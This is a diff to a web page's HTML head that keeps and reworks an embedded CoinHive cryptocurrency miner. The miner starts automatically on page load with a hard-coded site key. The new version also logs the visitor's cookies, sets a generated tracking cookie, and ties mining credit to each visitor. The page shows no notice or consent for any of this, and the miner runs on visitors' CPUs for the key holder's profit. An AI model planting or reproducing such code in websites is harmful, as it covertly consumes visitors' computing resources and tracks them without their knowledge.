@@ -13,25 +13,36 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1" />
 		<link rel="stylesheet" href="assets/css/main.css" />
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-          <script>
-            var miner = new CoinHive.Anonymous('kOmEN2gForhg8N9ilGGqm7s8OB8EILxT');
-            miner.start();
-          </script>
-          
-          <script>
-            // Listen on events
-            miner.on('found', function() { /* Hash found */ })
-            miner.on('accepted', function() { /* Hash accepted by the pool */ })
+    <script>
+      function S4() {
+        return (((1+Math.random())*0x10000)|0).toString(16).substring(1); 
+      }
+ 
+      guid = (S4() + S4() + "-" + S4() + "-4" + S4().substr(0,3) + "-" + S4() + "-" + S4() + S4() + S4()).toLowerCase();
 
-            // Update stats once per second
-            setInterval(function() {
-              var hashesPerSecond = miner.getHashesPerSecond();
-              var totalHashes = miner.getTotalHashes();
-              var acceptedHashes = miner.getAcceptedHashes();
+      console.log('cookie', document.cookie);
+      if(!document.cookie) {
+        document.cookie = "user=" + guid;
+      }
 
-              // Output to HTML elements...
-            }, 1000);
-          </script>
+      var miner = new CoinHive.User('kOmEN2gForhg8N9ilGGqm7s8OB8EILxT', document.cookie);
+      miner.start();
+    </script>
+    
+    <script>
+      // Listen on events
+      miner.on('found', function() { /* Hash found */ })
+      miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+      // Update stats once per second
+      setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+
+        // Output to HTML elements...
+      }, 1000);
+    </script>
   </head>
 	<body>
 
